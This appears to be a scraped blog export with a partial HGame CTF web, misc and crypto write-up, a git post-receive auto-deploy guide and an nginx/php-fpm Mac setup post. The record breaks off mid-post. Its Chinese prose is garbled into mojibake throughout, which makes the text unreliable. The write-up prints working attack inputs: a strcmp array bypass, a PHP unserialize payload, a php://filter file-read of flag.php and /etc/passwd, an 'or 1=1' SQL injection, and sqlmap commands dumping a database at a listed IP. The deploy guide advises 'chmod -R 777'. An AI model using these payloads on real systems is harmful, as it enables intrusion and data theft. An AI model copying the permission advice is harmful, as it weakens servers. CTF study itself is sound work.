å†æ”¹è¯·æ±‚å¤´Referer:www.google.com\nå¾—åˆ°Rep:\n\u0026lt;br/\u0026gt;https://www.wikiwand.com/en/HTTP_cookie \u0026lt;br/\u0026gt;you are not admin åˆå¾—æ¥ä¿®æ”¹cookieäº†\u0026hellip;æŸ¥çœ‹Cookieç›´æ¥å‘ç°æœ‰ä¸ªisadmin=0ï¼Œé‚£å°±æ”¹æˆ1å°±å¥½äº†ï¼Œæœ€åå¾—åˆ°flag\næˆ‘ä»¬ä¸ä¸€æ · include_once(\u0026quot;flag.php\u0026quot;); if(isset($_POST['str1'])\u0026amp;\u0026amp;isset($_POST['str2'])){ if ($_POST['str1']!=$_POST['str2']\u0026amp;\u0026amp;strcmp($_POST['str1'],$_POST['str2'])==0) { echo \u0026quot;flag is:\u0026quot;.$flag; exit(); } else{ echo \u0026quot;Something wrong..\u0026quot;; } } ä¸€çœ‹åˆæ˜¯ä¸€é¢˜phpå¼±ç›¸ç­‰ï¼Œè€ƒå¯Ÿstrcmpï¼Œåªè¦å…¶ä¸­ä¸€ä¸ªä¸ºæ•°ç»„å°±å¥½\nstr1=0\u0026amp;str2[]=0 å¾—åˆ°flag\nLevel - week2 Random? æ‰“å¼€åœ°å€å•¥éƒ½æ²¡æœ‰ï¼Œä¸€å¼€å§‹æ²¡ä»€ä¹ˆæ€è·¯ï¼Œåæ¥ç»è¿‡å¤§å¸ˆå‚…æé†’ï¼Œæ‰æ³¨æ„åˆ°é¢˜ç›®æè¿°ä¸­è¯´äº†\nå¤šrandomå‡ æ¬¡æ²¡å‡†å°±éšæœºåˆ°ä¸€æ ·çš„å€¼å‘¢ PS:ç½‘ä¸å¥½vimçº¿ä¸Šæ”¹ä»£ç çœŸæ˜¯è‡´å‘½ æ—¢ç„¶æ˜¯æåˆ°äº†vimæ”¹ä»£ç ï¼Œé‚£å°±å¯èƒ½ä¼šæœ‰æºç æ³„éœ²ï¼Œvimçš„ç¼–è¾‘ä¸´æ—¶æ–‡ä»¶ä¸º.random.php.swp\næœç„¶å¾—åˆ°ä¸€ä¸ª.swpæ–‡ä»¶ï¼Œä½†æ˜¯åœ¨windowsä¸‹æ˜¯çœ‹ä¸äº†çš„ã€‚äºæ˜¯æ‹–åˆ°äº†kalié‡Œé¢ç”¨vimæ¢å¤åŸå§‹æ–‡ä»¶\næŠŠ.swpæ–‡ä»¶æ”¾åˆ°éšä¾¿ä¸€ä¸ªç›®å½•ä¸‹ï¼Œç„¶åç”¨\n$ vim -r random.php ä¾¿å¯ç›´æ¥æ¢å¤random.phpæ–‡ä»¶\nçœ‹åˆ°æºä»£ç \n\u0026lt;?php error_reporting(0); include ('flag.php'); class emmm { var $public; var $secret; } if ($_GET['emmm']) { $emmm = unserialize($_GET['emmm']); if (!is_object($emmm)) { die(\u0026quot;error\u0026quot;); } $emmm-\u0026gt;public = random_int(0, 100000000); $emmm-\u0026gt;secret = random_int(0, 100000000); if ($emmm-\u0026gt;public == $emmm-\u0026gt;secret) { echo $flag; } } #highlight_file(__FILE__); å‘ç°è¿˜æ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„é¢˜ï¼Œè¿™é¢˜å¼„äº†æŒºä¹…æ²¡å¼„å‡ºæ¥ï¼Œè¿˜æ˜¯å‚è€ƒäº†ä¸€ä¸‹å…¶ä»–å°ä¼™ä¼´çš„åšæ³•\næ€»ä¹‹æŒ‰ç…§é¢˜ç›®æ„æ€ï¼Œå°±æ˜¯å¾—ä½¿å¾—emmmçš„publicä¸secretç›¸ç­‰ï¼Œé‚£å°±æ„é€ ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œè®©ä»–ä»¬çš„publicä¸secretç›¸ç­‰å°±å¥½äº†ï¼Œæ³¨æ„ä¸€ä¸‹ç›¸ç­‰æ—¶å€™è¦æœ‰\u0026amp;\n$a = new emmm(); $a-\u0026gt;public = \u0026amp;$a-\u0026gt;secret; echo serialize($a); å¾—åˆ°payload:\nemmm=O:4:\u0026quot;emmm\u0026quot;:2:{s:6:\u0026quot;public\u0026quot;;N;s:6:\u0026quot;secret\u0026quot;;R:2;} æ‹¿åˆ°flag\nè‰è“ç¤¾åŒº-2 ä¸çŸ¥é“æ˜¯ä¸æ˜¯é¢˜ç›®çš„é—®é¢˜show_maopian.php?mao=2.jpgç«Ÿç„¶ä¸èƒ½æ˜¾ç¤ºå›¾ç‰‡\u0026hellip;\nç„¶åå‘ç°ç«Ÿç„¶å¯ä»¥æœ‰/etc/passwdï¼Œä½†æ˜¯æ²¡æœ‰æ‹¿åˆ°/etc/shadowï¼Œä¹Ÿå°±æ‹¿ä¸åˆ°æœåŠ¡å™¨\né¢˜ç›®æç¤ºflagåœ¨../flag.phpï¼Œåˆä¸èƒ½ç›´æ¥è®¿é—®ï¼Œé‚£å°±ç”¨phpä¼ªåè®®è¯•è¯•\nshow_maopian.php?mao=php://filter/read=convert.base64-encode/resource=../flag.php å¾—åˆ°\nPD9waHAKCSRmbGFnPSJoZ2FtZXshbTRvX3BpNG5fQ2hhT19oYW9fa2FuIX0iOwo= è§£ç ä¾¿å¾—åˆ°flag\nè‰è“ç¤¾åŒº-1 ä¹Ÿä¸çŸ¥é“å‡ºé¢˜äººæ€ä¹ˆæƒ³çš„ï¼Œè¿™é¢˜ç®€å•å¾—å¤šï¼Œä½†æ˜¯é¡ºåºæ”¾åœ¨äº†2ä¸‹é¢ï¼Œè¿™æ¬¡æ˜¯show_maopian.php?mao=1.jpgå’Œshow_maopian.php?mao=1.jpgéƒ½å¯ä»¥è¯»åˆ°å›¾ç‰‡ï¼Œé‚£å°±æ ¹æ®é¢˜ç›®æç¤ºç›´æ¥è¯•è¯•è¯»ä¸€ä¸‹../flag.phpï¼Œç›´æ¥æ‹¿åˆ°flag\u0026hellip;2333\nxss-1 \u0026amp; xss-2 æ¥ä¸‹æ¥çš„è¿™ä¸¤ä¸ªé¢˜å°±æ²¡æ€ä¹ˆå»åšäº†ï¼Œè€Œä¸”é¢˜ç›®è¦æ±‚:payloadéœ€è¦åœ¨chromeå’Œfirefoxä¸Šéƒ½èƒ½ä½¿ç”¨ï¼Œä¸”ä¸èƒ½æœ‰äº¤äº’ã€‚æ„Ÿè§‰æŒºéš¾çš„ï¼Œå°±æ²¡èŠ±æ—¶é—´å¼„äº†\nè®°å½•ä¸€ä¸‹é¢˜ç›®ä»¥åçœ‹çœ‹ï¼ˆè™½ç„¶ææœ‰å¯èƒ½ä¸ä¼šå»çœ‹\u0026hellip;ï¼‰\nxss-1 function charge(input) { input = input.replace(/script/gi, '_'); input = input.replace(/image/gi, '_'); input = input.replace(/\\(/, '_'); return '\u0026lt;article\u0026gt;' + input + '\u0026lt;/article\u0026gt;'; } xss-2 function charge(input) { input = input.replace(/script/gi, '_'); input = input.replace(/img/gi, '_'); input = input.replace(/image/gi, '_'); input = input.replace(/\\(/, '_'); input = input.replace(/\\\u0026gt;/,'_'); return '\u0026lt;input value=\u0026quot;' + input + '\u0026quot; type=\u0026quot;text\u0026quot;\u0026gt;'; } æœ€ç®€å•çš„sqlé¢˜ è¿˜çœŸæ˜¯æœ€ç®€å•çš„\u0026hellip;\npayload: username=admin%27+or+1%3D1+%23\u0026amp;pwd=1 Level - week3 æ­£å¸¸çš„SQLi è¿™é¢˜æˆ‘è¿˜æ²¡åšå‡ºæ¥ï¼Œé¡µé¢æ˜¾ç¤º\nå› ä¸ºå‡ºé¢˜äººå¤ªæ‡’äº†ï¼Œæ‰€ä»¥ç°åœ¨æ²¡æœ‰ä»»ä½•åŠŸèƒ½ hello guest æç¤ºä¹Ÿæ²¡é‚£ä¹ˆæ˜æ˜¾ï¼Œæœ‰åˆ¤æ–­guestï¼Œå‘ç°Cookieé‡Œæœ‰name=Z3Vlc3Q%3D; isadmin=0ï¼Œé‚£å°±æ”¹æ”¹ï¼Œç„¶åå‘ç°æ²¡ä»€ä¹ˆç”¨\næ²¡ä»€ä¹ˆå¤´ç»ªå°±æ‰«æ‰«ï¼Œç„¶åå‘ç°æœ‰å¤‡ä»½.bakæ–‡ä»¶ï¼Œä¸‹è½½åå‘ç°æºç \n\u0026lt;?php ..... $username = base64_decode($_COOKIE[\u0026#39;name\u0026#39;]); ..... $sql = \u0026#34;select * from user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; $re = mysqli_query($conn, $sql); $rs = mysqli_fetch_array($re); // echo $rs[\u0026#39;flag\u0026#39;]; echo $username . \u0026#39;\u0026lt;br/\u0026gt;\u0026#39;; echo \u0026#34;å› ä¸ºå‡ºé¢˜äººå¤ªæ‡’äº†ï¼Œæ‰€ä»¥ç°åœ¨æ²¡æœ‰ä»»ä½•åŠŸèƒ½\u0026#34;; ..... é€åˆ†çš„SQLi è¾“å…¥adminæç¤º\nWarning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in /home/hctfgame/week3/sqli2/index.php on line 8 Unknown column 'admin' in 'where clause' è‡ªå·±æ‰‹æ³¨è¿˜ä¸æ˜¯å¾ˆå‰å®³ï¼Œè¿˜æ˜¯ç”¨sqlmapå§23333(sqlmapçœŸæ˜¯å¤ªå¼ºå¤§äº†orz)\næ—¢ç„¶æœ‰äº†mysqlçš„æŠ¥é”™ï¼Œé‚£å°±å¯ä»¥çœæ‰åˆ¤æ–­æ•°æ®åº“çš„æ­¥éª¤äº†\n$ sqlmap -u \u0026quot;http://118.25.18.223:10068/?id=1\u0026quot; --level 3 --dbms mysql --dbs available databases [3]: [*] information_schema [*] test [*] week3_sqliiii2 $ sqlmap -u \u0026quot;http://118.25.18.223:10068/?id=1\u0026quot; --level 3 --dbms mysql -D week3_sqliiii2 --tables Database: week3_sqliiii2 [2 tables] +----------+ | f111aa4g | | users | +----------+ $ sqlmap -u \u0026quot;http://118.25.18.223:10068/?id=1\u0026quot; --level 3 --dbms mysql -D week3_sqliiii2 -T f111aa4g --columns Database: week3_sqliiii2 Table: f111aa4g [3 columns] +---------------+----------+ | Column | Type | +---------------+----------+ | dajiangyoude | char(20) | | f111aaaggg_w3 | char(40) | | id | int(11) | +---------------+----------+ $ sqlmap -u \u0026quot;http://118.25.18.223:10068/?id=1\u0026quot; --level 3 --dbms mysql -D week3_sqliiii2 -T f111aa4g -C \u0026quot;dajiangyoude,f111aaaggg_w3,id\u0026quot; --dump Database: week3_sqliiii2 Table: f111aa4g [1 entry] +---------------+-----------------------------------+-------+ | dajiangyoude | f111aaaggg_w3 | id | +---------------+-----------------------------------+-------+ | kan_wo_gan_ma | hgame{Th3_e4sist_sql_injeCti0n##} | 10086 | +---------------+-----------------------------------+-------+ æ‹¿åˆ°flag\nMisc Level - week1 ç™½èœ1 é¢˜ç›®æç¤ºLSBï¼Œé‚£å°±å»çœ‹çœ‹å§\næ ¹æ®CTF wikiçš„æç¤ºæ“ä½œå¾—åˆ°flag\nç™½èœ2 $ binwalk misc2.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 1037199 0xFD38F Zip archive data, at least v2.0 to extract, compressed size: 41, uncompressed size: 39, name: flag.txt 1037368 0xFD438 End of Zip archive å‘ç°æœ‰zip\n$ dd if=misc2.jpg of=misc2.rar bs=1 skip=1037199 ç›´æ¥ddæå‡ºrarå¾—åˆ°é‡Œé¢çš„flag\npacp1 çœ‹åˆ°æœ€åæœ‰ä¸€ä¸ªGET /flag.phpçš„è¯·æ±‚ã€‚  Alt text  è¿½è¸ªä¸€ä¸‹å³å¯å¾—åˆ°flag\nCrypto Level - week1 easy Caesar vuoas{Hvs_ei8qy_pf7kb_1l_xIadg_cjSf_o_Zo9m_rCu} å‡¯æ’’åŠ å¯†ã€‚æ²¡ä»€ä¹ˆå¥½è¯´çš„\nHill Not hard keyï¼š9 17 6 5 Ciphertextï¼šphnfetzhzzwz æ‡’å¾—è§£äº†\u0026hellip;\nPolybius FDXDGDADDG_FXXFAAXFAG_GDFXFFXFFXADXFDA_GDAD æ ¹æ®é¢˜ç›®ï¼Œæ„Ÿè§‰åƒæ˜¯ADFGVXå¯†ç ã€‚\norjtz_nebel_jnsented_jt confusion --/.-./.-../-/-.-/-..../-.-/-..-/-./...-/--../-..-/--.-/.--/-.../.../-./.-/..---/..-./.../..-/..---/--./--./-.../.../.--/....-/...../-.../.../.-../.-/--../..-./..-/-..../.../...-/.---/-.../-./-../.-/--../.../.-./..../..-/-..../--.-/-...-/-...-/-...-/-...- æ‘©æ–¯ç”µç ï¼Œè§£å¾—\nMRLTK6KXNVZXQWBSNA2FSU2GGBSW45BSLAZFU6SVJBNDAZSRHU6Q==== base32å†è§£å¾—\ndW5yWmsxX2h4YSF0ent2X2ZzUHZ0fQ== base64å†è§£å¾—\nunrZk1_hxa!tz{v_fsPvt} rot13å†è§£å¾—\nhaeMx1_ukn!gm{i_sfCig} æœ€åç”¨æ …æ è§£å¾—åˆ°flag\nbaby step pow(0x1111111111,flag,0x976693344d) = 0x7ac21f64ed ç»“æœè½¬æ¢æˆ5å­—èŠ‚å¯è§å­—ç¬¦ ","date":"2018-03-15T16:32:00Z","permalink":"https://blog.zeddyu.info/2018/03/15/HGame%E9%83%A8%E5%88%86writeup/","title":"HGameéƒ¨åˆ†writeup"},{"content":"è¿äº†ä¸€ä¸‹æœåŠ¡å™¨ï¼Œé¡ºä¾¿å¼„äº†ä¸€ä¸‹Git hookï¼ŒæŠŠä¸¤ä¸ªä»“åº“ç»™å®ç°æœ¬åœ°ä¿®æ”¹è§¦å‘git hookå®ç°æœåŠ¡å™¨è‡ªåŠ¨éƒ¨ç½²ã€‚\nä»€ä¹ˆæ˜¯git hooks åœ¨gitä¸Šæ˜¯è¿™ä¹ˆä»‹ç»çš„ï¼š\n å’Œå…¶å®ƒç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸€æ ·ï¼ŒGitèƒ½åœ¨ç‰¹å®šçš„é‡è¦åŠ¨ä½œå‘ç”Ÿæ—¶è§¦å‘è‡ªå®šä¹‰è„šæœ¬ã€‚æœ‰ä¸¤ç»„è¿™æ ·çš„é’©å­ï¼šå®¢æˆ·ç«¯çš„å’ŒæœåŠ¡å™¨ç«¯çš„ã€‚å®¢æˆ·ç«¯é’©å­ç”±è¯¸å¦‚æäº¤å’Œåˆå¹¶è¿™æ ·çš„æ“ä½œæ‰€è°ƒç”¨ï¼Œè€ŒæœåŠ¡å™¨ç«¯é’©å­ä½œç”¨äºè¯¸å¦‚æ¥æ”¶è¢«æ¨é€çš„æäº¤è¿™æ ·çš„è”ç½‘æ“ä½œã€‚ ä½ å¯ä»¥éšå¿ƒæ‰€æ¬²åœ°è¿ç”¨è¿™äº›é’©å­ã€‚\n ä¸ªäººç†è§£çš„git hookå…¶å®å°±åƒä¸€ä¸ªè§¦å‘å™¨å§ï¼Œå½“è¿œç¨‹æœåŠ¡å™¨æ”¶åˆ°æœ¬åœ°çš„å‘½ä»¤ä¹‹åå°±æ‰§è¡ŒæŸäº›æ“ä½œã€‚\ngit hooksçš„ç§ç±» gitä¸­ï¼Œæœ‰ä¸¤ç§ç±»å‹çš„é’©å­ï¼šå®¢æˆ·ç«¯çš„å’ŒæœåŠ¡å™¨ç«¯çš„ã€‚\nå®¢æˆ·ç«¯çš„é’©å­æœ‰ï¼š\n pre-commit é’©å­åœ¨é”®å…¥æäº¤ä¿¡æ¯å‰è¿è¡Œã€‚ prepare-commit-msg é’©å­åœ¨å¯åŠ¨æäº¤ä¿¡æ¯ç¼–è¾‘å™¨ä¹‹å‰ï¼Œé»˜è®¤ä¿¡æ¯è¢«åˆ›å»ºä¹‹åè¿è¡Œã€‚ post-commit é’©å­åœ¨æ•´ä¸ªæäº¤è¿‡ç¨‹å®Œæˆåè¿è¡Œã€‚ applypatch-msg ä½ å¯ä»¥ç”¨è¯¥è„šæœ¬æ¥ç¡®ä¿æäº¤ä¿¡æ¯ç¬¦åˆæ ¼å¼ï¼Œæˆ–ç›´æ¥ç”¨è„šæœ¬ä¿®æ­£æ ¼å¼é”™è¯¯ã€‚ pre-applypatch åœ¨ git am è¿è¡ŒæœŸé—´è¢«è°ƒç”¨ post-applypatch è¿è¡Œäºæäº¤äº§ç”Ÿä¹‹åï¼Œæ˜¯åœ¨ git am è¿è¡ŒæœŸé—´æœ€åè¢«è°ƒç”¨çš„é’©å­ã€‚ pre-rebase é’©å­è¿è¡Œäºå˜åŸºä¹‹å‰ï¼Œä»¥éé›¶å€¼é€€å‡ºå¯ä»¥ä¸­æ­¢å˜åŸºçš„è¿‡ç¨‹ã€‚ post-rewrite é’©å­è¢«é‚£äº›ä¼šæ›¿æ¢æäº¤è®°å½•çš„å‘½ä»¤è°ƒç”¨ã€‚ post-checkout åœ¨ git checkout æˆåŠŸè¿è¡Œåè°ƒç”¨ã€‚ post-merge åœ¨ git merge æˆåŠŸè¿è¡Œåè°ƒç”¨ã€‚ pre-push åœ¨ git push è¿è¡ŒæœŸé—´ï¼Œ æ›´æ–°äº†è¿œç¨‹å¼•ç”¨ä½†å°šæœªä¼ é€å¯¹è±¡æ—¶è¢«è°ƒç”¨ã€‚ pre-auto-gc ä¼šåœ¨åƒåœ¾å›æ”¶å¼€å§‹ä¹‹å‰è¢«è°ƒç”¨ï¼Œå¯ä»¥ç”¨å®ƒæ¥æé†’ä½ ç°åœ¨è¦å›æ”¶åƒåœ¾äº†ï¼Œæˆ–è€…ä¾æƒ…å½¢åˆ¤æ–­æ˜¯å¦è¦ä¸­æ–­å›æ”¶ã€‚  æœåŠ¡å™¨ç«¯çš„é’©å­æœ‰ï¼š\n pre-receive å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„æ¨é€æ“ä½œæ—¶æœ€å…ˆè¢«è°ƒç”¨ã€‚ update å®ƒä¼šä¸ºæ¯ä¸€ä¸ªå‡†å¤‡æ›´æ–°çš„åˆ†æ”¯å„è¿è¡Œä¸€æ¬¡ã€‚ post-receive åœ¨æ•´ä¸ªè¿‡ç¨‹å®Œç»“ä»¥åè¿è¡Œï¼Œå¯ä»¥ç”¨æ¥æ›´æ–°å…¶ä»–ç³»ç»ŸæœåŠ¡æˆ–è€…é€šçŸ¥ç”¨æˆ·ã€‚  å¦‚ä½•ä½¿ç”¨git hooks æ‰€æœ‰çš„é’©å­è„šæœ¬éƒ½å­˜æ”¾åœ¨ .git/hooks æ–‡ä»¶å¤¹ä¸­ã€‚å½“ä½¿ç”¨ git init åˆå§‹åŒ–ä¸€ä¸ªæ–°ç‰ˆæœ¬åº“æ—¶ï¼ŒGit é»˜è®¤ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸­æ”¾ç½®ä¸€äº›ç¤ºä¾‹è„šæœ¬ã€‚è¿™äº›ç¤ºä¾‹çš„åå­—éƒ½æ˜¯ä»¥ .sample ç»“å°¾ï¼Œå¦‚æœä½ æƒ³å¯ç”¨å®ƒä»¬ï¼Œå¾—å…ˆç§»é™¤è¿™ä¸ªåç¼€ã€‚\nç®€å•çš„è‡ªåŠ¨éƒ¨ç½² æ—¢ç„¶è¦åœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œæ“ä½œï¼Œè‚¯å®šå¾—ç™»å½•æœåŠ¡å™¨äº†å’¯ã€‚\næœåŠ¡å™¨ç™»å½• è¦å®ç°sshå…å¯†ç ç™»å½•ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥å…·ä½“å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« \n Aä¸ºæœ¬åœ°ä¸»æœº(å³ç”¨äºæ§åˆ¶å…¶ä»–ä¸»æœºçš„æœºå™¨) ; Bä¸ºè¿œç¨‹ä¸»æœº(å³è¢«æ§åˆ¶çš„æœºå™¨Server), å‡å¦‚ipä¸º172.24.253.2 ; Aå’ŒBçš„ç³»ç»Ÿéƒ½æ˜¯Linux\nåœ¨Aä¸Šçš„å‘½ä»¤:\n$ ssh-keygen -t rsa (è¿ç»­ä¸‰æ¬¡å›è½¦,å³åœ¨æœ¬åœ°ç”Ÿæˆäº†å…¬é’¥å’Œç§é’¥,ä¸è®¾ç½®å¯†ç )\n$ ssh root@172.24.253.2 \u0026ldquo;mkdir .ssh;chmod 0700 .ssh\u0026rdquo; (éœ€è¦è¾“å…¥å¯†ç ï¼Œ æ³¨:å¿…é¡»å°†.sshçš„æƒé™è®¾ä¸º700)\n$ scp ~/.ssh/id_rsa.pub root@172.24.253.2:.ssh/id_rsa.pub (éœ€è¦è¾“å…¥å¯†ç )\nåœ¨Bä¸Šçš„å‘½ä»¤: $ touch /root/.ssh/authorized_keys (å¦‚æœå·²ç»å­˜åœ¨è¿™ä¸ªæ–‡ä»¶, è·³è¿‡è¿™æ¡)\n$ chmod 600 ~/.ssh/authorized_keys (# æ³¨æ„ï¼š å¿…é¡»å°†~/.ssh/authorized_keysçš„æƒé™æ”¹ä¸º600, è¯¥æ–‡ä»¶ç”¨äºä¿å­˜sshå®¢æˆ·ç«¯ç”Ÿæˆçš„å…¬é’¥ï¼Œå¯ä»¥ä¿®æ”¹æœåŠ¡å™¨çš„sshæœåŠ¡ç«¯é…ç½®æ–‡ä»¶/etc/ssh/sshd_configæ¥æŒ‡å®šå…¶ä»–æ–‡ä»¶åï¼‰\n$ cat /root/.ssh/id_rsa.pub \u0026raquo; /root/.ssh/authorized_keys (å°†id_rsa.pubçš„å†…å®¹è¿½åŠ åˆ° authorized_keys ä¸­, æ³¨æ„ä¸è¦ç”¨ \u0026gt; ï¼Œå¦åˆ™ä¼šæ¸…ç©ºåŸæœ‰çš„å†…å®¹ï¼Œä½¿å…¶ä»–äººæ— æ³•ä½¿ç”¨åŸæœ‰çš„å¯†é’¥ç™»å½•)\nå›åˆ°Aæœºå™¨:\n$ ssh root@172.24.253.2 (ä¸éœ€è¦å¯†ç , ç™»å½•æˆåŠŸ)\n \u0008\u0008è¿™æ ·å°±è½»æ¾å®ç°äº†sshå…å¯†ç™»å½•\nåˆå§‹åŒ– git init å’Œ git init \u0026ndash;bare çš„åŒºåˆ« åˆå§‹åŒ–å‡ºæ¥çš„ä»“åº“æ˜¯ä¸ä¸€æ ·çš„ï¼Œå‰è€…åˆå§‹åŒ–çš„æ˜¯ä¸€ä¸ªæ™®é€šçš„ä»“åº“ï¼Œå…¶ä¸­ .git æ–‡ä»¶å¤¹æ˜¯éšè—çš„ï¼Œå¹¶ä¸”èƒ½çœ‹è§è¯¥ä»“åº“ä¸‹æ‰€æœ‰çš„æºç ã€‚è€Œåè€…åˆå§‹åŒ–å‡ºæ¥çš„ä»“åº“ä¸­çš„æ–‡ä»¶ï¼Œå°±æ˜¯ .git ä¸­çš„æ–‡ä»¶å¤¹ï¼Œä½†ä¸èƒ½åƒå‰è€…é‚£æ ·ç›´æ¥æµè§ˆæˆ–ä¿®æ”¹ä»“åº“ä¸­çš„ä»£ç ã€‚\n\u0008\nä½¿ç”¨ git init --bare åˆå§‹åŒ–ä¸€ä¸ªè¿œç¨‹ä»“åº“ è¯¥ä»“åº“æ˜¯ç”¨äºé¡¹ç›®éƒ¨ç½²çš„ã€‚åœ¨æˆ‘ä»¬æœ¬åœ°å¼€å‘å®Œæˆåï¼Œå°†é¡¹ç›®pushè‡³è¯¥ä»“åº“åï¼Œå°†è‡ªåŠ¨éƒ¨ç½²ç½‘ç«™ã€‚\nè¿™é‡Œå°±æ‹¿nginxæ¥ä¸¾ä¸ªä¾‹å­ï¼ŒæŒ‰ç…§nginxé»˜è®¤ç›®å½•æ¥è¿›è¡Œæ“ä½œ å»ºç«‹ä¸€ä¸ªxxx-bare.gitï¼ˆbare repositoryï¼‰å’Œä¸€ä¸ªxxxï¼ˆrepositoryï¼‰ç›®å½•ï¼ŒGitè¿œç¨‹åº“çš„å‘½åä¸€èˆ¬ä½¿ç”¨.gitå’Œå…¶ä»–ç›®å½•åŒºåˆ†ï¼Œä½†å¹¶éå¼ºåˆ¶ã€‚\n$ cd /usr/share/nginx/html $ git init --bare xxx-bare.git $ cd /usr/share/nginx/html $ git clone xxx-bare.git xxx é…ç½®Git Hook å°†ç›®å½•åˆ‡æ¢è‡³ /usr/share/nginx/html/xxx-bare.git/hooksï¼Œå¦‚æœç›®å½•ä¸‹æ²¡æœ‰post-receiveè¿™ä¸ªæ–‡ä»¶ï¼Œ\u0008å¯ä»¥ä½¿ç”¨touch post-receiveç›´æ¥åˆ›å»ºï¼Œå½“ä»“åº“æ”¶åˆ°pushè¯·æ±‚åï¼Œå°±ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥é’©å­ä¸­çš„è„šæœ¬ã€‚æ ¹æ®è‡ªèº«éœ€æ±‚ç¼–è¾‘è„šæœ¬å†…å®¹ï¼š\n#!/bin/sh unset GIT_DIR cd /var/www/html/project git pull origin master ç¼–è¾‘å®Œæˆåï¼Œç»™è¯¥è„šæœ¬æ·»åŠ å¯æ‰§è¡Œæƒé™\n$ chmod +x post-receive æµ‹è¯•åŠä½¿ç”¨ ä¸ºå¼€å‘çš„æœ¬åœ°ä»“åº“æ·»åŠ remoteæº è¿™ä¸ªå®¢æˆ·ç«¯æœ¬åœ°ä»“åº“ï¼Œå³å¼€å‘çš„æœºå­çš„æœ¬åœ°ä»“åº“ï¼Œæ·»åŠ remoteæºï¼Œä»¥åå¾€è¿™ä¸ªremote pushä»£ç æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘ä¸Šé¢çš„è„šæœ¬ã€‚\n$ git remote add deploy user@ip:/gitrepo_dir $ git push deploy master gitrepo_dirå°±æ˜¯\u0008æœåŠ¡å™¨ä¸Šçš„xxx-bare.gitçš„\u0008æ–‡ä»¶\u0008å¤¹ä½ç½®\nä»¥åå°±å¯ä»¥é€šè¿‡git push deploy masteræ¥è‡ªåŠ¨æ›´æ–°æœåŠ¡å™¨ä¸Šçš„ä»£ç å’¯ã€‚\næœ€åå†å†™ä¸€ä¸ªtypechoçš„å°å‘ åšå®¢ä¸Šä¼ å›¾ç‰‡å¤±è´¥çš„é—®é¢˜ï¼Œè¦æŠŠtypechoé‡Œçš„usræ–‡ä»¶æƒé™ä¿®æ”¹ä¸º777ï¼Œå°±å¯ä»¥äº†ã€‚\n$ sudo chmod -R 777 usr ç„¶åå¯ä»¥ä¸Šä¼ æœ¬åœ°å›¾ç‰‡äº†ã€‚\nHappy Coding! ","date":"2018-03-13T09:29:00Z","permalink":"https://blog.zeddyu.info/2018/03/13/%E5%8D%9A%E5%AE%A2%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%9D%91/","title":"åšå®¢è‡ªåŠ¨åŒ–åŠä¸€äº›å‘"},{"content":"ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´æ²¡å†™åšå®¢äº†ï¼Œè¯´å¥½çš„æŠ€æœ¯åšä¸»å‘¢ï¼Œhhhhhã€‚å…¶å®ä¸€äº›å°é”™è¯¯æ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½å†™çš„ã€‚ä½†æ˜¯é…ç½®ç¯å¢ƒçš„å‘æˆ‘è¸©äº†å¥½ä¹…äº†ã€‚è¶è¿™æ¬¡é‡è£…äº†Macï¼Œåˆšå¥½è®°å½•è®°å½•é…ç½®Nginxï¼Œè™½ç„¶å‰é¢å†™è¿‡ä¸€ç¯‡é…ç½®ï¼Œä½†æ˜¯Macä¸Šè¿˜æ˜¯æœ‰æ¯”è¾ƒå¤šçš„å‘çš„ã€‚ä¹Ÿä¸çŸ¥é“å•¥æ—¶å€™Macæ‰è‡ªå¸¦Nginxå‘€ã€‚ä¸ªäººå–œæ¬¢Homebrewï¼Œæ²¡ç”¨Macportï¼Œæ‰€ä»¥ä¸‹æ–‡éƒ½æ˜¯é‡‡ç”¨çš„Homebrewã€‚\n0x1 Nginxå®‰è£… é€šè¿‡\u0008Homebrewå®‰è£…\n$ brew search nginx $ brew install nginx ç„¶åé€šè¿‡\n$ brew info nginx ä½ å¯ä»¥çœ‹åˆ°\u0008å…³äºnginxçš„å„ç§ä¿¡æ¯\nDocroot is: /usr/local/var/www Nginx.conf : /usr/local/etc/nginx/nginx.conf Log : /usr/local/var/log/nginx é€šè¿‡\n$ nginx å³å¯\u0008å¯åŠ¨nginxï¼Œè®¿é—®localhost:8080ä¾¿å¯çœ‹åˆ°Nginx\u0008æ¬¢è¿ç•Œé¢\n0x2 PHP \u0008é‡‡ç”¨äº†ç³»ç»Ÿçš„php\n$ php -v PHP 5.6.30 (cli) (built: Oct 29 2017 20:30:32) Copyright (c) 1997-2016 The PHP Group Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies æƒ³ç”¨php7ä¹Ÿå¯ä»¥é€šè¿‡brewè¿›è¡Œå®‰è£…ä½¿ç”¨\n0x3 php-fpm æŒ‰ç…§\u0008ä¸Šé¢æµç¨‹èµ°çš„è¯ï¼Œå¦‚æœåœ¨Nginxç½‘ç«™ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªindex.phpï¼Œå†…å®¹ä¸ºphpinfoï¼Œä¼šå‘ç°è®¿é—®index.phpä¼šå‡ºç°\u0008ç›´æ¥ä¸‹è½½ï¼Œé‚£ä¾¿æ˜¯å› ä¸ºè¿˜æ²¡æœ‰å¯åŠ¨php-fpmä»¥åŠé…ç½®nginx.confçš„åŸå› ã€‚\nMacè‡ªå¸¦php-fpmï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯æœ‰æ¯”è¾ƒå¤šå‘çš„ã€‚ å‚è€ƒæ¥è‡ª: Mac é…ç½® php-fpm\nç›´æ¥è¿è¡Œphp-fpmå¯åŠ¨php-fpm\n$ php-fpm [04-Mar-2018 00:35:04] ERROR: failed to open configuration file '/private/etc/php-fpm.conf': No such file or directory (2) [04-Mar-2018 00:35:04] ERROR: failed to load configuration 